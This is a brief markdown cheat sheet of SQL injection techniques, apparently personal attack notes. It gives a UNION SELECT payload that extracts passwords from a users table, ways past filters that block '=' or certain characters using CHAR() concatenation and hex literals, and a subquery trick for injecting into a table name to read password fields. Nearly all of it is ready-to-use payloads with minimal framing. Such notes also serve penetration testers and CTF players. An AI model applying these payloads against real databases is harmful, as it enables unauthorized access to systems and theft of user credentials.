# Basic

## Select injection

#### Basic

`-100 UNION SELECT password from users`

union the results of the intended query with more information (just make sure number of columns match)

#### Col Num Nismatch

you can use `join` instead of union

## Blacklists

#### Blocked "="?

`id = 1` can also be written as `id in (1)`

#### Blocked characters?

As long as you can use string concatination you can replace most fields where a term is blocked with

`(select CHAR(97)||CHAR(98)...)`

in addition remember sql lets you have hex strings in leu of text.

`0x12345`


## Injecting into table field

if you have something like

`select id from <injection>`

utilise sub queries, this will grab the password field instead of the id field and give it a alias so the query compiles

`select id from (select password as id from users)`

##
